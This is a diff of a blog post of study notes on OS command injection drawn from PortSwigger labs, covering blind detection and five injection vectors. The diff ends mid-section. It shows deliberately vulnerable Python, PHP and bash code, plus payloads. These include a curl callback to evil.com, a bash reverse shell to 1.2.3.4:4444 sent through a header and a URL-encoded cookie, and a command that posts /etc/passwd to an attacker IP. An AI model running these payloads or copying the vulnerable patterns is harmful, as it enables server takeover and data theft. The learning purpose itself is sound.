@@ -19,17 +19,17 @@
   <meta name="author" content="Fantasea">
   <meta name="keywords" content="">
   
-    <meta name="description" content="本篇整理自 PortSwigger Web Security Academy 的学习内容，覆盖 OS 命令注入的原理、盲注确认技巧，以及五种常见的注入途径（表单、上传文件名、HTTP 头、Cookie、日志），附实操截图与反弹 shell 原理笔记。  一、OS 命令注入命令注入也被称为 shell 注入。它允许攻击者在运行应用程序的服务器上执行操作系统（OS）命令，通常可以完全攻陷该应用及其数">
+    <meta name="description" content="订正说明：本文于 2026-09-18 订正——修正了 Cookie 注入绕过的正确写法（应用 URL 编码而非双引号）、日志注入的生效机制（eval 重新解析）及若干格式问题，并把”shell 注入扩展”合并进本篇。初版发布于 2026-09-17。   本篇整理自 PortSwigger Web Security Academy 的学习内容，覆盖 OS 命令注入的原理、盲注确认技巧，以及五种">
 <meta property="og:type" content="article">
 <meta property="og:title" content="服务器漏洞之shell注入">
 <meta property="og:url" content="https://fantasea123.github.io/blog/2026/09/17/20260917-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E%E4%B9%8Bshell%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Fantasea&#39;s blog">
-<meta property="og:description" content="本篇整理自 PortSwigger Web Security Academy 的学习内容，覆盖 OS 命令注入的原理、盲注确认技巧，以及五种常见的注入途径（表单、上传文件名、HTTP 头、Cookie、日志），附实操截图与反弹 shell 原理笔记。  一、OS 命令注入命令注入也被称为 shell 注入。它允许攻击者在运行应用程序的服务器上执行操作系统（OS）命令，通常可以完全攻陷该应用及其数">
+<meta property="og:description" content="订正说明：本文于 2026-09-18 订正——修正了 Cookie 注入绕过的正确写法（应用 URL 编码而非双引号）、日志注入的生效机制（eval 重新解析）及若干格式问题，并把”shell 注入扩展”合并进本篇。初版发布于 2026-09-17。   本篇整理自 PortSwigger Web Security Academy 的学习内容，覆盖 OS 命令注入的原理、盲注确认技巧，以及五种">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fantasea123.github.io/blog/img/shell-inject-1.png">
 <meta property="og:image" content="https://fantasea123.github.io/blog/img/shell-inject-2.png">
 <meta property="article:published_time" content="2026-09-17T07:00:00.000Z">
-<meta property="article:modified_time" content="2026-09-17T14:53:40.302Z">
+<meta property="article:modified_time" content="2026-09-18T06:47:48.000Z">
 <meta property="article:author" content="Fantasea">
 <meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="PortSwigger">
@@ -334,7 +334,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.3k 字
+          6.5k 字
         
       </span>
     
@@ -345,7 +345,7 @@
         
         
         
-          53 分钟
+          55 分钟
         
       </span>
     
@@ -390,17 +390,20 @@
               <div class="markdown-body">
                 
                 <blockquote>
+<p><strong>订正说明</strong>：本文于 2026-09-18 订正——修正了 Cookie 注入绕过的正确写法（应用 URL 编码而非双引号）、日志注入的生效机制（eval 重新解析）及若干格式问题，并把”shell 注入扩展”合并进本篇。初版发布于 2026-09-17。</p>
+</blockquote>
+<blockquote>
 <p>本篇整理自 PortSwigger Web Security Academy 的学习内容，覆盖 OS 命令注入的原理、盲注确认技巧，以及五种常见的注入途径（表单、上传文件名、HTTP 头、Cookie、日志），附实操截图与反弹 shell 原理笔记。</p>
 </blockquote>
-<h2 id="一、OS-命令注入"><a href="#一、OS-命令注入" class="headerlink" title="一、OS 命令注入"></a>一、OS 命令注入</h2><p>命令注入也被称为 shell 注入。它允许攻击者在运行应用程序的服务器上执行操作系统（OS）命令，通常可以完全攻陷该应用及其数据。通常情况下，攻击者还可以利用 OS 命令注入漏洞去攻陷托管基础设施的其他部分，并利用系统之间的信任关系，将攻击横向移动（pivot）到组织内部的其他系统。</p>
+<h2 id="一、OS-命令注入"><a href="#一、OS-命令注入" class="headerlink" title="一、OS 命令注入"></a>一、OS 命令注入</h2><p>命令注入也被称为 <strong>shell 注入</strong>。它允许攻击者在运行应用程序的服务器上<strong>执行操作系统（OS）命令</strong>，通常可以完全攻陷该应用及其数据。通常情况下，攻击者还可以利用 OS 命令注入漏洞去攻陷托管基础设施的其他部分，并利用系统之间的信任关系，将攻击<strong>横向移动（pivot）到组织内部的其他系统</strong>。</p>
 <p>常用 shell 元字符：</p>
 <p><img src="/blog/img/shell-inject-1.png" alt="常用 shell 元字符"></p>
-<h2 id="二、盲注：响应里看不到输出怎么办"><a href="#二、盲注：响应里看不到输出怎么办" class="headerlink" title="二、盲注：响应里看不到输出怎么办"></a>二、盲注：响应里看不到输出怎么办</h2><p>当注入点存在，但服务器的响应里看不到命令输出。比如你提交了 <code>product_id=1; whoami</code>，页面返回的内容和以前一模一样。这时你无法确定：</p>
+<h2 id="二、盲注：响应里看不到输出怎么办"><a href="#二、盲注：响应里看不到输出怎么办" class="headerlink" title="二、盲注：响应里看不到输出怎么办"></a>二、盲注：响应里看不到输出怎么办</h2><p><strong>当注入点存在，但服务器的响应里看不到命令输出</strong>。比如你提交了 <code>product_id=1; whoami</code>，页面返回的内容和以前一模一样。这时你无法确定：</p>
 <ul>
 <li>漏洞真的存在？</li>
 <li>还是我的命令语法错了、被过滤了？</li>
 </ul>
-<p>这时要用其他技术确认漏洞存在。</p>
+<p>这时要用其他技术确认漏洞存在：</p>
 <p><strong>① 用 DNS&#x2F;HTTP 回连确认</strong></p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp; nslookup attacker-controlled-domain.com &amp;</span><br></code></pre></td></tr></table></figure>
 
@@ -416,69 +419,71 @@
 <h2 id="三、注入示例：库存查询功能"><a href="#三、注入示例：库存查询功能" class="headerlink" title="三、注入示例：库存查询功能"></a>三、注入示例：库存查询功能</h2><p>在这个例子中，一个购物应用允许用户查看某个商品在特定门店是否有货。该信息通过如下 URL 获取：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://insecure-website.com/stockStatus?productID=<span class="hljs-number">381</span>&amp;storeID=<span class="hljs-number">29</span><br></code></pre></td></tr></table></figure>
 
-<p>为了提供库存信息，应用程序必须查询各种老旧系统（legacy systems）。由于历史原因，这个功能是通过调用一条 shell 命令实现的，商品 ID 和门店 ID 作为参数传入：</p>
+<p>为了提供库存信息，应用程序必须查询各种老旧系统（legacy systems）。由于历史原因，这个功能是通过<strong>调用一条 shell 命令</strong>实现的，商品 ID 和门店 ID 作为参数传入：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">stockreport</span>.pl <span class="hljs-number">381</span> <span class="hljs-number">29</span><br></code></pre></td></tr></table></figure>
 
 <p>这条命令会输出指定商品的库存状态，并返回给用户。</p>
 <p>现在攻击者提交：</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp; echo aiwefwlguh &amp;</span><br></code></pre></td></tr></table></figure>
 
-<p>如果这个输入被提交到 productID 参数，应用程序实际执行的命令就是：</p>
+<p>如果这个输入被提交到 <code>productID</code> 参数，应用程序实际执行的命令就是：</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">stockreport.pl <span class="hljs-meta">&amp; echo aiwefwlguh &amp; 29</span><br></code></pre></td></tr></table></figure>
 
-<p><code>echo</code> 命令会把提供的字符串原样输出，这是测试某些类型 OS 命令注入的实用方法。<code>&amp;</code> 字符是 shell 的命令分隔符。在这个例子里，它使三条独立的命令依次执行。返回给用户的输出是：</p>
+<p><code>echo</code> 命令会把提供的字符串原样输出，这是测试某些类型 OS 命令注入的实用方法。<code>&amp;</code> 字符是 shell 的<strong>命令分隔符</strong>。在这个例子里，它使三条独立的命令并行。返回给用户的输出是：</p>
 <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>- productID was not provided<br>aiwefwlguh<br>29: command not found<br></code></pre></td></tr></table></figure>
 
 <p>这三行输出证明了：</p>
-<ul>
+<ol>
 <li>原本的 <code>stockreport.pl</code> 命令在没有收到预期参数的情况下执行了，因此返回了一条错误信息。</li>
 <li>注入的 <code>echo</code> 命令执行了，提供的字符串被回显在输出中。</li>
 <li>原本的参数 <code>29</code> 被当作一条命令执行了，从而产生了一个错误。</li>
-</ul>
-<p>在注入的命令后面再加一个 <code>&amp;</code> 分隔符很有用，因为它把注入的命令和注入点之后的内容隔离开了，这降低了”后面的内容妨碍注入命令执行”的概率。</p>
+</ol>
+<p>在注入的命令后面再加一个 <code>&amp;</code> 分隔符很有用，因为它把注入的命令和注入点之后的内容<strong>隔离开</strong>了，这降低了”后面的内容妨碍注入命令执行”的概率。</p>
+<p>除此之外 shell 注入还有很多种途径，这里放在 shell 注入扩展详细解释。</p>
 <blockquote>
 <p><strong>tips：<code>;</code> 和 <code>&amp;</code> 的区别</strong></p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">命令<span class="hljs-selector-tag">A</span> ; 命令<span class="hljs-selector-tag">B</span>     → <span class="hljs-selector-tag">A</span> 先跑，shell 等 <span class="hljs-selector-tag">A</span> 跑完，再跑 <span class="hljs-selector-tag">B</span>（串行）<br>命令<span class="hljs-selector-tag">A</span> &amp; 命令<span class="hljs-selector-tag">B</span>     → <span class="hljs-selector-tag">A</span> 被扔到后台，shell 不等它，立刻开始跑 <span class="hljs-selector-tag">B</span>（并行）<br></code></pre></td></tr></table></figure>
 </blockquote>
-<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p><img src="/blog/img/shell-inject-2.png" alt="shell 注入实操"></p>
-<p>除此之外，shell 注入还有很多种途径，详细解释见下文的”shell 注入扩展”。</p>
+<p><strong>实操</strong></p>
+<p><img src="/blog/img/shell-inject-2.png" alt="shell 注入实操"></p>
 <h2 id="四、shell-注入扩展：五种注入途径"><a href="#四、shell-注入扩展：五种注入途径" class="headerlink" title="四、shell 注入扩展：五种注入途径"></a>四、shell 注入扩展：五种注入途径</h2><p>除了最开始提到的 URL 查询参数，还有以下几类注入点。</p>
-<h3 id="1-POST-表单"><a href="#1-POST-表单" class="headerlink" title="1. POST 表单"></a>1. POST 表单</h3><p>场景：一个”导出销售报表”功能，用户填写日期范围和文件名，点击导出。</p>
-<p>漏洞代码（Python&#x2F;Flask）：</p>
+<h3 id="1-POST-表单查询"><a href="#1-POST-表单查询" class="headerlink" title="1. POST 表单查询"></a>1. POST 表单查询</h3><p><strong>场景</strong>：一个”导出销售报表”功能，用户填写日期范围和文件名，点击导出。</p>
+<p><strong>漏洞代码（Python&#x2F;Flask）</strong>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/export&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>) </span><span class="hljs-comment"># 声明，访问/export的post请求会让下面的这个函数处理</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">export</span>():    <br>  filename = request.form[<span class="hljs-string">&quot;filename&quot;</span>]    <span class="hljs-comment"># 把导出数据压缩成用户命名的文件    </span><br>  subprocess.run(<span class="hljs-string">&quot;zip /tmp/exports/&quot;</span> + filename + <span class="hljs-string">&quot;.zip /tmp/data.csv&quot;</span>, shell=<span class="hljs-literal">True</span>)<br>  ...<br></code></pre></td></tr></table></figure>
 
-<p>payload：<code>filename = report; whoami &gt; /var/www/static/who.txt ;</code></p>
+<p><strong>payload</strong>：<code>filename = report; whoami &gt; /var/www/static/who.txt ;</code></p>
 <p>解释：</p>
 <ul>
 <li><code>request.form[&quot;filename&quot;]</code>：Python Flask 框架里，<code>request.form</code> 相当于 PHP 的 <code>$_POST</code>——从表单正文取值。</li>
 <li><code>subprocess.run(命令字符串, shell=True)</code>：Python 里执行 shell 命令的函数，对应 PHP 的 <code>exec</code>。<code>shell=True</code> 表示”把字符串交给 shell 解析执行”；如果写 <code>shell=False</code> 并用列表传参，shell 就没有机会解释 <code>;</code> 这些字符。</li>
 <li>Python 里 <code>+</code> 就是 PHP 的 <code>.</code>。</li>
 </ul>
-<p>注入过程：把 filename 改成 <code>report; whoami &gt; /var/www/static/w.txt</code>，拼出的命令：</p>
+<p><strong>注入过程</strong>：把 <code>filename</code> 改成 <code>report; whoami &gt; /var/www/static/who.txt</code> ;</p>
+<p><strong>拼出的命令</strong>：</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">zip <span class="hljs-regexp">/tmp/</span>exports<span class="hljs-regexp">/report; whoami &gt; /</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/www/</span><span class="hljs-keyword">static</span><span class="hljs-regexp">/who.txt ;.zip /</span>tmp/data.csv<br></code></pre></td></tr></table></figure>
 
-<p>shell 切成三段执行，中间那条把 whoami 结果写进 Web 目录。</p>
-<h3 id="2-文件上传的文件名"><a href="#2-文件上传的文件名" class="headerlink" title="2. 文件上传的文件名"></a>2. 文件上传的文件名</h3><p>漏洞代码：</p>
+<p>shell 切成三段执行，中间那条把 <code>whoami</code> 结果写进 Web 目录。</p>
+<h3 id="2-文件上传的文件名"><a href="#2-文件上传的文件名" class="headerlink" title="2. 文件上传的文件名"></a>2. 文件上传的文件名</h3><p><strong>漏洞代码</strong>：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;/uploads/&quot;</span> . <span class="hljs-variable">$name</span>);              <br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;convert /uploads/&quot;</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot; -resize 100x100 /uploads/thumb_&quot;</span> . <span class="hljs-variable">$name</span>);   <br></code></pre></td></tr></table></figure>
 
 <ul>
-<li><code>move_uploaded_file(临时文件, 目标路径)</code>：PHP 处理上传的标准动作——把临时文件挪到正式目录。漏洞在于目标文件名用了用户的原始文件名。</li>
+<li><code>move_uploaded_file(临时文件, 目标路径)</code>：PHP 处理上传的标准动作——把临时文件挪到正式目录。漏洞在于<strong>目标文件名用了用户的原始文件名</strong>。</li>
 <li><code>convert</code> 是 ImageMagick 图片处理程序的命令。这行代码的意图：给上传的图生成一张 100×100 的缩略图。</li>
 </ul>
-<p>注入过程：你上传一个真图片（内容是正常图片都行），但把文件名改成：</p>
+<p><strong>注入过程</strong>：你上传一个真图片（内容是正常图片都行），但把文件名改成：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">x.jpg; curl http://evil.com/$(<span class="hljs-built_in">whoami</span>) ;<br></code></pre></td></tr></table></figure>
 
 <p>服务器收到后，<code>$name</code> 就是这串文字，拼出的命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">convert /uploads/x.jpg; curl http://evil.com/$(<span class="hljs-built_in">whoami</span>) ; -resize 100x100 ...<br></code></pre></td></tr></table></figure>
 
-<p>shell 依次执行：<code>convert</code>（缩图正常进行）、<code>curl</code>（向攻击者的网站发请求，URL 里带着当前用户名）。攻击者在自己的服务器日志里就看到了 <code>root</code>。</p>
+<p>shell 依次执行：<code>convert</code>（缩图正常进行）、<code>curl</code>（<strong>向攻击者的网站发请求，URL 里带着当前用户名</strong>）。攻击者在自己的服务器日志里就看到了 <code>root</code>。</p>
 <h3 id="3-HTTP-头"><a href="#3-HTTP-头" class="headerlink" title="3. HTTP 头"></a>3. HTTP 头</h3><p>网站在负载均衡（反向代理）后面，程序看到的连接 IP 都是代理自己的，所以真实用户 IP 要从头里读——这是非常常见的架构，也是漏洞的温床。</p>
-<p>漏洞代码：</p>
+<p><strong>漏洞代码</strong>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ip = request.headers.get(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>, request.remote_addr)<br><span class="hljs-keyword">if</span> is_rate_limited(ip):    <span class="hljs-comment"># ← 判断这个IP是否请求太频繁（触发限流才会走到下一行）      </span><br>    os.system(<span class="hljs-string">&quot;iptables -A INPUT -s &quot;</span> + ip + <span class="hljs-string">&quot; -j DROP&quot;</span>)    <br>    <span class="hljs-comment">#      ↑iptables 是 Linux 的防火墙命令    </span><br>    <span class="hljs-comment">#       -A INPUT   在&quot;入站规则链&quot;里追加一条    </span><br>    <span class="hljs-comment">#       -s 某IP    针对来自这个IP的流量    </span><br>    <span class="hljs-comment">#       -j DROP    直接丢弃</span><br></code></pre></td></tr></table></figure>
 
 <ul>
 <li><code>os.system(&quot;...&quot;)</code>：执行 shell 命令的 Python 函数，和 <code>subprocess.run(shell=True)</code> 一样危险。</li>
-<li>开发者的逻辑：防火墙封杀攻击者。漏洞在于封禁的目标 IP 来自一个<strong>可伪造的头</strong>。</li>
+<li>开发者的<strong>逻辑</strong>：防火墙封杀攻击者。漏洞在于封禁的目标 IP <strong>来自一个可伪造的头</strong>。</li>
 </ul>
 <p>发起正常请求，但额外加一个头：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">1.2.3.4</span>; bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">1.2.3.4</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
@@ -497,35 +502,33 @@
 <p><code>&gt;&amp;</code> 是 <code>1&gt;&amp;2</code> 的思想扩展。标准用法：</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">命令 <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>    <span class="hljs-meta"># 读作：把 fd 2 接到<span class="hljs-string">&quot;fd 1 目前所接的地方&quot;</span>              </span><br>            <span class="hljs-meta"># 2&gt;&amp; 表示<span class="hljs-string">&quot;重定向 fd 2&quot;</span>，&amp;1 表示<span class="hljs-string">&quot;目标 = fd 1 当前指向的设施&quot;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><code>&amp;</code> 在这里的含义是：<code>&amp;</code> 后面跟的是”编号”而不是”文件名”。没有 <code>&amp;</code> 的话，<code>2&gt;1</code> 会把报错写进一个名叫 <code>1</code> 的文件；<code>2&gt;&amp;1</code> 才是”接到 1 号通道去”。</p>
-<p>而 <code>&gt;&amp; 文件</code> 是 bash 的简写合并形式，意思是：fd 1 接到 file，然后 fd 2 也接到 file 所在的地方，也就是报错和正常输出都会从你设置的这个 file 里看到，也就是设置的 <code>/dev/tcp/1.2.3.4/4444</code>。</p>
-<p>后面的 <code>0&gt;&amp;1</code> 的意思是，把你的输入（也就是 fd 0）和 fd 1 目前所接的地方连接上，三个路径同时接入。</p>
+<p><code>&amp;</code> 在这里的含义是：**<code>&amp;</code> 后面跟的是”编号”而不是”文件名”**。没有 <code>&amp;</code> 的话，<code>2&gt;1</code> 会把报错写进一个名叫 <code>1</code> 的文件；<code>2&gt;&amp;1</code> 才是”接到 1 号通道去”。</p>
+<p>而 <strong><code>&gt;&amp; 文件</code> 是 bash 的简写合并形式</strong>，意思是：fd 1 接到 file，然后 fd 2 也接到 file 所在的地方，也就是报错和正常输出都会从你设置的这个 file 里看到，也就是设置的 <code>/dev/tcp/1.2.3.4/4444</code>。</p>
+<p>后面的 <code>0&gt;&amp;1</code> 的意思是，把你的输入（也就是 fd 0）和 <code>fd 1 目前所接的地方</code> 连接上，三个路径同时接入。</p>
 <p>具体流程为：</p>
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">TCP连接 →[<span class="hljs-number">0</span>]→ <span class="hljs-keyword">bash </span>    攻击者敲的字，<span class="hljs-keyword">bash </span>当命令收<br><span class="hljs-keyword">bash </span>→[<span class="hljs-number">1</span>]→ TCP连接     <span class="hljs-keyword">bash </span>的结果发回攻击者屏幕<br><span class="hljs-keyword">bash </span>→[<span class="hljs-number">2</span>]→ TCP连接     <span class="hljs-keyword">bash </span>的报错也发回攻击者屏幕<br></code></pre></td></tr></table></figure>
 
-<h3 id="4-Cookie"><a href="#4-Cookie" class="headerlink" title="4. Cookie"></a>4. Cookie</h3><p>漏洞代码：</p>
+<h3 id="4-Cookie"><a href="#4-Cookie" class="headerlink" title="4. Cookie"></a>4. Cookie</h3><p><strong>漏洞代码</strong>：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$user</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">//PHP 自动把请求头里的 Cookie 解析成 $_COOKIE </span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/opt/scripts/build_cache.sh &quot;</span> . <span class="hljs-variable">$user</span>);<span class="hljs-comment">//服务器上脚本，按用户名给该用户生成缓存文件</span><br></code></pre></td></tr></table></figure>
 
-<p>注入过程：用 curl 发请求并塞一个恶意 Cookie：</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-string">&quot;https://目标站/&quot;</span> <span class="hljs-punctuation">-</span>H &#x27;Cookie: username=&quot;任意; bash -i &gt;&amp; /dev/tcp/1.2.3.4/<span class="hljs-number">4444</span> 0&gt;&amp;1&quot;&#x27;<br></code></pre></td></tr></table></figure>
+<p><strong>注入过程</strong>：用 curl 发请求并塞一个恶意 Cookie：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> <span class="hljs-string">&quot;https://目标站/&quot;</span> -H &#x27;Cookie: username=任意%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>bash%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>/dev/tcp/<span class="hljs-number">1.2.3.4</span>/<span class="hljs-number">4444</span>%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>&#x27;<br></code></pre></td></tr></table></figure>
 
-<p>服务器拼出：</p>
+<p>payload 整体做了 URL 编码：<code>;</code>→<code>%3B</code>、空格→<code>%20</code>、<code>&gt;</code>→<code>%3E</code>、<code>&amp;</code>→<code>%26</code>。</p>
+<p><strong>服务器拼出</strong>：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>scripts<span class="hljs-regexp">/build_cache.sh 任意; bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">1.2</span>.<span class="hljs-number">3.4</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<p>和例 3 的区别：数据来源从头换成了 Cookie。<code>username=</code> 后面故意留空，让原命令”空跑”，<code>;</code> 后面接反弹 shell。</p>
-<blockquote>
-<p><strong>注意</strong>：<code>;</code> 是官方规定的 cookie 分隔符。如 <code>Cookie: a=1; b=2</code> 就是两个 cookie。所以 username 里的值需要带上双引号，防止被分割成两个 cookie。</p>
-</blockquote>
-<h3 id="5-二级域名"><a href="#5-二级域名" class="headerlink" title="5. 二级域名"></a>5. 二级域名</h3><p>漏洞脚本（每天在服务器后台定时跑的统计脚本）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># 从 Nginx 访问日志里统计每个子域名的访问量</span><br><span class="hljs-keyword">for</span> host <span class="hljs-keyword">in</span> $(grep -oP <span class="hljs-string">&#x27;Host: \K[^\s]+&#x27;</span> /var/log/nginx/access.log | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span>)<br><span class="hljs-comment">#遍历日志里出现过的每个 Host 值（先 grep 抽出来，排序去重）</span><br><span class="hljs-keyword">do</span>    subdomain=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$host</span> | <span class="hljs-built_in">cut</span> -d. -f1)    <br><span class="hljs-comment">#域名第一段：admin.目标站 → &quot;admin&quot;</span><br>    grep <span class="hljs-variable">$host</span> /var/log/nginx/access.log | <span class="hljs-built_in">wc</span> -l &gt; /stats/<span class="hljs-variable">$subdomain</span>.count    <br>    <span class="hljs-comment">#   统计这个域名在日志里出现多少行          结果写入 /stats/域名首段.count    </span><br>    <span class="hljs-comment">#   $subdomain 没加引号直接拼进 shell</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<p><code>;</code> 是官方规定的 cookie 分隔符（<code>Cookie: a=1; b=2</code> 就是两个 cookie），且解析时<strong>无条件按 <code>;</code> 切分</strong>，直接写 <code>username=&quot;任意; bash ...&quot;</code> 会被在第一个 <code>;</code> 处腰斩，PHP 只拿到 <code>任意</code>。应在 payload 进行编码。</p>
+<p><code>%3B</code> 是 <code>;</code>，解码后 <code>;</code> 才出现在值里。</p>
+<p>空格用 <code>%20</code> 而非 <code>+</code>（<code>+</code> 当空格只在旧版 PHP 成立）。</p>
+<h3 id="5-二级域名"><a href="#5-二级域名" class="headerlink" title="5. 二级域名"></a>5. 二级域名</h3><p><strong>漏洞脚本</strong>（<strong>每天在服务器后台定时跑</strong>的统计脚本）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># 从 Nginx 访问日志里统计每个子域名的访问量</span><br><span class="hljs-keyword">for</span> host <span class="hljs-keyword">in</span> $(grep -oP <span class="hljs-string">&#x27;Host: \K[^\s]+&#x27;</span> /var/log/nginx/access.log | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span>)<br><span class="hljs-comment">#遍历日志里出现过的每个 Host 值（先 grep 抽出来，排序去重）</span><br><span class="hljs-keyword">do</span>    subdomain=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$host</span> | <span class="hljs-built_in">cut</span> -d. -f1)    <br><span class="hljs-comment">#域名第一段：admin.目标站 → &quot;admin&quot;</span><br>    <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;grep <span class="hljs-variable">$host</span> /var/log/nginx/access.log | wc -l &gt; /stats/<span class="hljs-variable">$subdomain</span>.count&quot;</span>    <br>    <span class="hljs-comment">#   统计这个域名在日志里出现多少行          结果写入 /stats/域名首段.count    </span><br>    <span class="hljs-comment">#   漏洞：eval 把拼好的整串重新当 shell 源码解析</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
 
-<p>执行流程：发一个 Host 头为该 payload 的请求 → 只在日志里留下一行记录，当下无事发生 → cron 下次运行脚本 → <code>$subdomain</code> 展开成 payload → shell 按 <code>;</code> 分段，curl 那段执行 → <code>/etc/passwd</code> 内容以 POST 形式到达攻击者服务器。</p>
-<h4 id="为什么-payload-要写成-x-curl-IFS-d-etc-passwd-IFS-http-3221225985"><a href="#为什么-payload-要写成-x-curl-IFS-d-etc-passwd-IFS-http-3221225985" class="headerlink" title="为什么 payload 要写成 x;curl${IFS}-d@/etc/passwd${IFS}http://3221225985"></a>为什么 payload 要写成 <code>x;curl$&#123;IFS&#125;-d@/etc/passwd$&#123;IFS&#125;http://3221225985</code></h4><p>要点：payload 不是直接进 shell 的，中间要穿过两道”剪刀”，所以它不能随便写，必须满足三个约束：</p>
